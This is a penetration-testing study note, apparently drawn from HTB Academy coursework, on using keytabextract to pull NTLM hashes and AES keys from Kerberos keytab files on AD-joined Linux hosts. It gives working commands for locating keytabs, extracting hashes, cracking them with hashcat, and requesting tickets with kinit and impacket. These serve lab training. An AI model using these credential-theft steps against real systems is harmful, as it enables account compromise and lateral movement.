# keytabextract

**Tags:** #keytabextract #Kerberos #keytab #CredentialDumping #ActiveDirectory #Linux #hashcrack

`keytabextract.py` pulls the useful secrets out of a Kerberos **keytab** file. A keytab stores a principal's long-term keys so a service or scheduled job can authenticate without a password prompt — which means anyone who can read one gets that principal's NTLM hash and AES keys. On Linux AD-joined boxes these turn up in `/etc/`, backup dirs, and cron-referenced paths; extracting the hash gives you offline-crackable material or a hash to pass directly.

**Source:** https://github.com/sosdave/KeyTabExtract
**Install:** `git clone https://github.com/sosdave/KeyTabExtract` — single Python script

```bash
# Extract realm, principal, NTLM hash, and AES keys from a keytab
python3 keytabextract.py /etc/krb5.keytab
python3 keytabextract.py /opt/specialfiles/carlos.keytab

# Typical output:
#   REALM : INLANEFREIGHT.HTB
#   SERVICE PRINCIPAL : carlos/...
#   NTLM HASH : 2892d26cdf84d7a70e2eb3b9f05c425e
#   AES-256 HASH : ...
```

```bash
# Then crack the NTLM hash offline (mode 1000) or pass it
hashcat -m 1000 <ntlm_hash> /usr/share/wordlists/rockyou.txt
```

> [!tip] Find keytabs before extracting: `find / -name "*keytab*" -ls 2>/dev/null`, and check `crontab -l` for `kinit ... -k -t <path>` lines — cron jobs that authenticate via keytab reveal exactly where the readable ones live.

> [!note] A keytab with the AES keys lets you skip cracking entirely — use the key directly for OverPass-the-Hash / ticket requests (`kinit`, Rubeus `asktgt /aes256:`). The NTLM hash is the fallback when only RC4 is present.

---

## Inspect First, and Use Without Cracking

Before extracting, list the keytab's contents — this tells you which principals and
**encryption types** it holds. keytabextract only recovers an **NTLM hash if an RC4
(etype 23 / `arcfour-hmac`) entry exists**; an AES-only keytab yields just AES keys.

```bash
# List principals + enctypes + timestamps (no creds needed, just read access)
klist -k -e -t /etc/krb5.keytab
```

Often you don't need the tool at all — if you can **read** a keytab you can authenticate
straight from it:

```bash
# Get a TGT directly from the keytab (no extraction, no cracking)
kinit -kt /etc/krb5.keytab 'carlos/host@INLANEFREIGHT.HTB'
klist                                   # confirm the TGT is cached

# Or turn an extracted AES key into a ticket from your attack box (impacket)
impacket-getTGT -aesKey <aes256_key> INLANEFREIGHT.HTB/carlos
```

Reach for keytabextract specifically when you want **crackable/passable material** (the
NTLM hash for offline cracking, or the AES key to reuse elsewhere) rather than a ticket
bound to this host's clock and realm config.

> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Password Attacks|Password Attacks]] — Kerberos keytab hash extraction on Linux AD systems; pairs with [[Tools/Auth/hashcat|hashcat]] for the offline crack.

---

*Created: 2026-07-31*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
